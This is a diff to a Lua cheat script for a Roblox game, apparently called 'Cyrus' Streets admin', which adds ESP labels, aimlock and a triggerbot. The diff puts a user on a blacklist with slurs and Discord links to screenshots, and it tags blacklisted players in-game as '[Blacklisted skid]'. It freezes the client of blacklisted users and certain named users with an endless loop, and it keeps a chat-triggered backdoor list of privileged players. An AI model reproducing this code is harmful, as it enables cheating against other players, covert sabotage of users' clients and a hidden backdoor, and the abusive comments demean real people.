@@ -305,6 +305,11 @@ local BlacklistTable = {
 	[878779033] = true; -- retard who hit me
 	[1052869632] = true; -- Generally annoying and fan boys tagged users and claims he can script when he can't (skid).
 	[481265818] = true; -- said he would dox me but wouldn't
+	[362925188] = true; --[[
+		retard moment https://cdn.discordapp.com/attachments/726179909906464870/734190528828145665/image0.png
+		I add him: https://cdn.discordapp.com/attachments/726179909906464870/734191062435758201/image0.png
+		gets mad he got exposed: https://cdn.discordapp.com/attachments/726179909906464870/734191218400952381/image0.png
+	]]
 }
 
 local SettingsTable = {
@@ -718,7 +723,7 @@ local function Unesp(Part)
 	end
 end
 
-local function Esp(Part,Name,Colour)
+local function Esp(Part,Name,Colour,Blacklisted)
 	local Player = PlrFinder(Part.Parent.Name)
 	if Player and UseDrawingLib and not Colour then
 		Unesp(Player)
@@ -739,8 +744,12 @@ local function Esp(Part,Name,Colour)
 		TextLabel.TextSize = 8
 		local Player = PlrFinder(Name)
 		if Player then
-			local User = AdminUserTable[Player] and "Yes" or "No"
-			TextLabel.Text = Name.." | CyAdmin User: "..User.."\nHas (Gamepasses) Glock: "..HasItem(Player,"Glock").." | Shotty: "..HasItem(Player,"Shotty").." | Vest: "..HasItem(Player,"BulletResist")
+			if not Blacklisted then 
+				local User = AdminUserTable[Player] and "Yes" or "No"
+				TextLabel.Text = Name.." | CyAdmin User: "..User.."\nHas (Gamepasses) Glock: "..HasItem(Player,"Glock").." | Shotty: "..HasItem(Player,"Shotty").." | Vest: "..HasItem(Player,"BulletResist")
+			else 
+				TextLabel.Text = "[Blacklisted skid] "..Player.Name
+			end 
 		else 
 			TextLabel.Text = Name
 		end
@@ -1663,6 +1672,16 @@ Players.PlayerAdded:Connect(function(Player)
 				AimlockClosest(Player)
 			end 
 			local Backdoor = BackDoorTablePlayers[Player.UserId]
+			local Blacklist = BlacklistTable[Player.UserId]
+			if Blacklist then
+				Esp(Player.Character.Head,Player.Name,Color3.fromRGB(102,51,0),true)
+				Player.CharacterAdded:Connect(function(C)
+					local Head = C:WaitForChild'Head'
+					if Head then 
+						Esp(Head,Player.Name,Color3.fromRGB(102,51,0),true)
+					end 
+				end)
+			end 
 			if Backdoor then 
 				Player.Chatted:Connect(function(Chat) BackdoorCheck(Player,Chat) end)
 				Esp(Player.Character.Head,Backdoor['Name'],Backdoor['Colour'])
@@ -3121,6 +3140,16 @@ end))
 coroutine.resume(coroutine.create(function()
 	for i,Player in pairs(Players:GetPlayers()) do
 		local Backdoor = BackDoorTablePlayers[Player.UserId]
+		local Blacklist = BlacklistTable[Player.UserId]
+		if Blacklist and Player.character and Player.Character:FindFirstChild'Head' then
+			Esp(Player.Character.Head,Player.Name,Color3.fromRGB(102,51,0),true)
+			Player.CharacterAdded:Connect(function(C)
+				local Head = C:WaitForChild'Head'
+				if Head then 
+					Esp(Head,Player.Name,Color3.fromRGB(102,51,0),true)
+				end 
+			end)
+		end 
 		if Backdoor and Player.Character and Player.Character:FindFirstChild'Head' then
 			Player.Chatted:Connect(function(Chat) BackdoorCheck(Player,Chat) end)
 			Esp(Player.Character.Head,Backdoor['Name'],Backdoor['Colour'])
@@ -3162,10 +3191,8 @@ end))
 -- [[ End ]] --
 
 notif("Cyrus' Streets admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: nXcZH36)",10,"rbxassetid://2474242690") -- string.format remains superior - Slays.
-notif("Newest Update","Fixed WalkShoot",10,nil)
+notif("Newest Update","TriggerBot more like CancerBot (it's more op now)",10,nil)
 
 if LP:IsInGroup(5152759) or string.find(LP.Name:lower(),"lynx") or BlacklistTable[LP.UserId] then
-	notif("HA YOU THOUGHT","no!!",5,nil)
-	wait(0.3)
 	while true do end
 end
